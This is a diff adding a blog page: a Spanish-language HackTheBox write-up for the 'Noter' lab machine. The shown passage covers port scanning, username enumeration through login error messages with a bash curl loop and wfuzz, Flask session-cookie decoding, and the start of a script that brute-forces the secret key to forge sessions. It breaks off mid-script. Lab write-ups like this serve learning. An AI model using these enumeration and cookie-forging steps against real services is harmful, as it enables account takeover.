@@ -1,0 +1,1281 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox Writeup Noter" /><meta property="og:locale" content="en" /><meta name="description" content="Overview:" /><meta property="og:description" content="Overview:" /><link rel="canonical" href="https://e1p0tr0.github.io/posts/HTBNoter/" /><meta property="og:url" content="https://e1p0tr0.github.io/posts/HTBNoter/" /><meta property="og:site_name" content="Marss" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-07-16T04:08:17-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackthebox Writeup Noter" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-07-16T04:08:17-05:00","datePublished":"2022-07-16T04:08:17-05:00","description":"Overview:","headline":"Hackthebox Writeup Noter","mainEntityOfPage":{"@type":"WebPage","@id":"https://e1p0tr0.github.io/posts/HTBNoter/"},"url":"https://e1p0tr0.github.io/posts/HTBNoter/"}</script><title>Hackthebox Writeup Noter | Marss</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Marss"><meta name="application-name" content="Marss"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Marss</a></div><div class="site-subtitle font-italic">Freelance Professional [eJPTv2]</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/E1P0TR0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['marsello.guillen','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox Writeup Noter</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Writeup Noter</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Marsello Guillén</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1657962497" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-07-16 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="5393 words"> <em>29 min</em> read</span></div></div></div><div class="post-content"><h2 id="overview"><span class="mr-2">Overview:</span><a href="#overview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>User validation by <strong>Error Messages in Login process</strong>.<li>Brute force default <strong>Flask’s Session Management</strong>.<li>User passwords, Backup code, database credentials by <strong>Information Leakage</strong>.<li>Remote code execution <strong>CVE-2021-23639</strong> (foothold).<li>MySQL running like root <strong>User-Defined function to RCE)</strong> (privilege escalation).</ul><hr /><p><img data-src="/assets/img/htb/writeups/noter/logo.png" alt="NoterLogo" class="shadow" data-proofer-ignore></p><div class="table-wrapper"><table><thead><tr><th style="text-align: center">OS<th style="text-align: center">IP<th style="text-align: center">Release Date<th style="text-align: center">Difficulty<th style="text-align: center">Points<tbody><tr><td style="text-align: center">Linux<td style="text-align: center">10.10.11.160<td style="text-align: center">07 May 2022<td style="text-align: center">Medium<td style="text-align: center">30</table></div><hr /><p>Antes de empezar verificamos que estamos conectado a la <strong>VPN</strong> de HTB y tenemos conexión con la máquina:</p><div class="language-shell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="o">&gt;</span> ping <span class="nt">-c1</span> 10.10.11.160
+PING 10.10.11.160 <span class="o">(</span>10.10.11.160<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.11.160: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>108 ms
+                                          <span class="se">\_</span>_____________________ Linux Machine
+<span class="nt">---</span> 10.10.11.160 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+          <span class="se">\_</span>________________<span class="se">\_</span>___________________________________ Successful connection
+rtt min/avg/max/mdev <span class="o">=</span> 106.937/106.937/106.937/0.000 ms
+</pre></table></code></div></div><blockquote><p>Explicación de parámetros:</p><p>-c &lt;count&gt; : Número de paquetes ICMP que deseamos enviar a la máquina</p></blockquote><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Con <code class="language-plaintext highlighter-rouge">nmap</code> realizamos un escaneo de tipo <strong>TCP (Transfer Control Protocol)</strong> para descubrir puertos abiertos:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="go">❯ nmap -p- -sS --min-rate 5000 -n -Pn 10.10.11.160
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-16 16:20 -05
+Nmap scan report for 10.10.11.160
+Host is up (0.11s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE
+21/tcp   open  ftp
+		\___________ File Transfer Protocol
+22/tcp   open  ssh
+		\___________ Secure Shell Protocol
+5000/tcp open  upnp
+		\___________ Universal Plug and Play Protocol
+</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p- : Escanear todos los puertos, del 1 al 65,535</p><p>-sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo</p><p>--min-rate &lt;number&gt; : Enviar una taza (&lt;number&gt;) de paquetes por segundo como mínimo</p><p>-n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS)</p><p>-Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneo</p></blockquote><p>Ahora realizamos un escaneo a profundidad de los puertos <strong>21(FTP) - 22(SSH) - 5000(UPNP)</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre><span class="go">❯ nmap -p21,22,5000 -sCV 10.10.11.160 -oN targetTCP
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-16 16:26 -05
+Nmap scan report for 10.10.11.160
+Host is up (0.11s latency).
+
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+</span><span class="gp">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
+<span class="go">| ssh-hostkey: 
+|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)
+|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)
+|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)
+5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
+|_http-title: Noter
+|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
+</span><span class="gp">Service Info: OSs: Unix, Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
+</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p &lt;port_1,port_2,...&gt; : Indicamos que puertos queremos escanear</p><p>-sCV (Fusión de parámetros -sC -sV)</p><p>-sC : Ejecutar en los puertos scripts por defecto de nmap</p><p>-sV : Activar detección de versiones de los servicios que corren por los puertos</p><p>-oN &lt;file&gt; : Guardar el output del escaneo en un archivo con formato Nmap</p></blockquote><p>Empezamos por el puerto <strong>21(FTP)</strong> intentando logearnos con el método <strong>Anonymous FTP</strong> pero no logramos nada. Por otro lado, ya que no disponemos de credenciales válidas omitimos el puerto <strong>22(SSH)</strong></p><p>Algo importante con el escaneo de <code class="language-plaintext highlighter-rouge">nmap</code> es que logramos visualizar la versión de cada servicio y con ello podemos darnos una idea a que distribución de Linux nos estaríamos enfrentando. Por ejemplo, al buscar en internet la versión <strong>OpenSSH 8.2p1 Ubuntu 4ubuntu0.3</strong> seguido de <a href="https://launchpad.net/">launchpad</a> <strong>(plataforma opensource que proporciona <em>source code hosting</em> entre otras funciones)</strong> y con ellos logramos ver que podriamos estar frente a un máquina de distro <strong>Ubuntu</strong> con el codename o release <strong>Focal</strong></p><p>Solo nos queda escanear el puerto <strong>5000(UPNP)</strong> que ahora lo detecta como servicio <strong>(HTTP)</strong> y con ello buscamos sus tecnologías:</p><blockquote><p>Usando <code class="language-plaintext highlighter-rouge">whatweb</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="go">❯ whatweb http://10.10.11.160:5000
+http://10.10.11.160:5000 [200 OK] Bootstrap[3.3.7], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.8.10], IP[10.10.11.160], Python[3.8.10], Script[text/javascript], Title[Noter], Werkzeug[2.0.2]
+</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Si quieres una opción gráfica puedes usar en tu navegador la extensión <a href="https://www.wappalyzer.com/apps/">Wappalyzer</a> y ver las tecnologías</p></div></blockquote><p>Es importante comentar que probemos diferentes herramientas y así confirmar nuestros resultados como también encontrar nueva información:</p><blockquote><p>Usando <code class="language-plaintext highlighter-rouge">webtech</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre><span class="go">❯ webtech -u http://10.10.11.160:5000 --json | jq
+{
+  "http://10.10.11.160:5000": {
+    "tech": [
+      {
+        "name": "Python",
+        "version": "3.8.10"
+      },
+      {
+        "name": "Bootstrap",
+        "version": "3.3.7"
+      },
+      {
+        "name": "Flask", &lt;---------- New information
+        "version": "2.0.2"
+      }
+    ],
+    "headers": []
+  }
+}
+</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Puedes instala la herramienta de <code class="language-plaintext highlighter-rouge">python</code> : <code class="language-plaintext highlighter-rouge">pip install webtech</code></p></div></blockquote><p>Observamos muchas tecnologías asociadas al lenguaje <code class="language-plaintext highlighter-rouge">Python</code>, así que ya podemos tener una idea.</p><blockquote class="prompt-tip"><div><p>Si fuera el caso que no encontramos el uso del microframework <code class="language-plaintext highlighter-rouge">Flask</code>, podemos deducir de su uso ya que por defecto <code class="language-plaintext highlighter-rouge">Flask</code> usa el puerto <strong>5000</strong> para lanzar el servidor de tu aplicación web</p></div></blockquote><p>Siguiendo con la fase de reconocimiento pasemos a ver la interfaz de la web:</p><blockquote><p>Ingresando con <code class="language-plaintext highlighter-rouge">Firefox</code></p></blockquote><p><img data-src="/assets/img/htb/writeups/noter/http_web.png" alt="HTTPWeb" class="shadow" data-proofer-ignore></p><p>De primeras observamos una aplicación para poder tomar notas. Ya que podemos logearnos intentamos usar credenciales por defecto (admin:admin, administrator:administrator, guest:guest). Solo logramos observar un mensaje de credenciales inválidas:</p><p><img data-src="/assets/img/htb/writeups/noter/invalid_credentials.png" alt="InvalidCredentials" data-proofer-ignore></p><p>Estos mensajes son importantes y podemos tomar la ventaja de <strong>validar usuarios</strong> respecto al mensaje que vemos en pantalla. Por ejemplo, nos creamos un usuario y escribimos una <strong>contraseña incorrecta</strong> para ver como responde la web:</p><p><img data-src="/assets/img/htb/writeups/noter/invalid_login.png" alt="InvalidLogin" data-proofer-ignore></p><p>Ojito, podemos llegar a la conlusión que podemos <strong>validar usuarios en la aplicación</strong> respecto al mensaje de error. Entonces procedemos a “Fuzzear” posibles usuarios:</p><blockquote><p>Usando un script en <code class="language-plaintext highlighter-rouge">bash</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre><span class="go">❯ cat enumerate_users.sh
+</span><span class="gp">#</span><span class="o">!</span>/bin/bash
+<span class="go">
+</span><span class="gp">list=$</span><span class="o">(</span>locate xato-net-10-million-usernames-dup.txt<span class="o">)</span>
+<span class="go">
+</span><span class="gp">while read -r user;</span><span class="w"> </span><span class="k">do</span>
+<span class="gp">        response=$</span><span class="o">(</span>curl <span class="nt">-si</span> <span class="nt">-d</span> <span class="s2">"username=</span><span class="nv">$user</span><span class="s2">&amp;password=dadaada"</span> <span class="nt">-i</span> http://10.10.11.160:5000/login | <span class="nb">grep </span>Invalid | <span class="nb">awk</span> <span class="nt">-F</span><span class="s2">"&gt;"</span> <span class="s1">'{print $2}'</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s2">"&lt;"</span> <span class="s1">'{print $1}'</span><span class="o">)</span>
+<span class="gp">        if [[ $</span>response <span class="o">==</span> <span class="s2">"Invalid login"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+<span class="gp">                echo $</span>user <span class="s2">":"</span> <span class="nv">$response</span>
+<span class="gp">        fi;</span><span class="w">
+</span><span class="gp">done &lt; $</span>list<span class="p">;</span> <span class="nb">wait</span>
+<span class="go">❯ bash ./enumerate_users.sh
+blue : Invalid login &lt;-------- Found user!
+</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Puedes encontrar el pequeño script en mi repositorio: <a href="https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/Auto-tools_Noter/user_enumeration/enumerate_users.sh">https://github.com/E1P0TR0</a></p></div></blockquote><blockquote><p>Con la herramienta <code class="language-plaintext highlighter-rouge">wfuzz</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre><span class="go">❯ wfuzz -c -t 50 -w /usr/share/SecLists/Usernames/xato-net-10-million-usernames-dup.txt -d 'username=FUZZ&amp;password=badpassword' --ss 'Invalid login' http://10.10.11.160:5000/login
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.160:5000/login
+Total requests: 624370
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                               
+=====================================================================
+
+000000113:   200        68 L     110 W      2033 Ch     "blue" &lt;------- Found user!
+</span></pre></table></code></div></div><p>Ambos casos encontramos al usuario <code class="language-plaintext highlighter-rouge">blue</code>, así que lo tenemos en cuenta para mas adelante. Ahora veamos el funcionamiento de la aplicación web</p><p>En resumen, podemos agregar, almacenar, editar y ver nuestras notas. Además al agregar una nota o ver en la herramienta <code class="language-plaintext highlighter-rouge">Wappalyzer</code> encontramos el uso de la tecnología <code class="language-plaintext highlighter-rouge">CKEditor 4.6.2</code> (editor de texto para páginas web)</p><p>A pesar de saber la versión y sus respectivas vulnerabilidades, solo encontramos un <strong>XSS Attack</strong> en el tag html <code class="language-plaintext highlighter-rouge">&lt;textarea&gt;</code> al agregar contenido a una nota a pesar que se aplique <strong>ACF (Advanced Content Filter)</strong>:</p><p><img data-src="/assets/img/htb/writeups/noter/xss_attack.png" alt="XSSAttack" class="shadow" data-proofer-ignore></p><p>Después de mucha búsqueda no logre aprovecharme de esta posible brecha, en tal caso puede ser un <strong>Rabbit Hole</strong>, el cuál podemos tomarlo como una situación donde no llegaremos a algo en concreto y solo perderemos tiempo.</p><p>Mirando para otra dirección, ya que tenemos una cuenta, es probable que tengamos una <strong>Cookie de sesión</strong>. Para ver esta cookie podemos presionar las teclas <strong>Ctrl+Shift+I</strong> ó <strong>F12</strong> (<em>pestaña storage</em>):</p><p><img data-src="/assets/img/htb/writeups/noter/web_cookie.png" alt="Cookie" class="shadow" data-proofer-ignore></p><p>Observando el formato parece un <strong>JWT (Json Web Token)</strong>. Sin embargo, averiguando más y sabiendo las tecnologías que se usan, llegamos a la conlusión que se trata de <strong>Flask’s Session Management</strong>. En resumen, <code class="language-plaintext highlighter-rouge">Flask</code> por defecto usa “cookies firmadas” para almacenar la información de la sesión de un cliente en la aplicación. A pesar que no están encriptadas (solo codificadas en <code class="language-plaintext highlighter-rouge">base64</code>), están firmadas con una <strong>secret key</strong>, y tienen el siguiente formato:</p><p><img data-src="/assets/img/htb/writeups/noter/flask_cookie.png" alt="FlaskCookie" class="shadow" data-proofer-ignore></p><blockquote><p><strong>Session data</strong> : La data actual de la sesión</p><p><strong>Timestamp</strong> : Avisa al servidor la última vez que la data fue actualizada (puede ser el la hora actual)</p><p><strong>Cryptographic hash</strong> : Hash calculado con tu data, el timestamp y la “secret key” del servidor</p></blockquote><p>En nuestro caso tenemos el siguiente payload:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="go">❯ echo eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibWFyc3MifQ.YtNqqg.zx1mPLX7-d2VQgWsQzx8K78zBgc | base64 -d | jq
+base64: invalid input
+{
+  "logged_in": true,
+  "username": "marss"
+}
+</span></pre></table></code></div></div><p>Con toda la información obtenida y sabiendo que tenemos el nombre de un usuario válido <code class="language-plaintext highlighter-rouge">blue</code>, solo tenemos que encontrar la correcta “secret key” para poder generar su respectiva cookie y obtener su sesión</p><h2 id="foothold"><span class="mr-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Buscando en internet encotramos que existe una herramienta llamada <code class="language-plaintext highlighter-rouge">flask-unsign</code> que nos automatiza todo el proceso hallando la <strong>secret key</strong> y generando una nueva con el payload que especifiquemos</p><blockquote class="prompt-info"><div><p>Aquí puede encontrar la herramienta <code class="language-plaintext highlighter-rouge">flask-unsign</code>: <a href="https://pypi.org/project/flask-unsign/">https://pypi.org/project/flask-unsign/</a></p></div></blockquote><p>Por gusto propio y a manera de aprender y entender cuál es el proceso para obtener esa preciada <strong>secret key</strong>, hice un scrip en <code class="language-plaintext highlighter-rouge">python</code> en el cuál le pasas la <strong>cookie</strong> y el <strong>nuevo payload que deseas insertar</strong> para que por <strong>Brute force</strong> consiga la <strong>secret key</strong> y la nueva cookie:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">signal</span><span class="p">,</span> <span class="n">argparse</span><span class="p">,</span> <span class="n">json</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">hashlib</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">itsdangerous</span> <span class="kn">import</span> <span class="n">URLSafeTimedSerializer</span><span class="p">,</span> <span class="n">TimestampSigner</span><span class="p">,</span> <span class="n">BadSignature</span>
+<span class="kn">from</span> <span class="nn">flask.json.tag</span> <span class="kn">import</span> <span class="n">TaggedJSONSerializer</span>
+
+<span class="c1"># ctrl + c
+</span><span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">failure</span><span class="p">(</span><span class="s">"Interruption"</span><span class="p">);</span> <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
+
+<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>
+
+<span class="c1"># arguments
+</span><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'Brute force attack "Secret key" of a Flask session cookie by default'</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-cookie'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'session cookie to crack'</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-payload'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"""new payload to create a valid session cookie ( '{"key":"value"}' )"""</span><span class="p">)</span>
+
+<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+<span class="c1"># create wordlist
+</span><span class="k">def</span> <span class="nf">load_wordlist</span><span class="p">():</span>
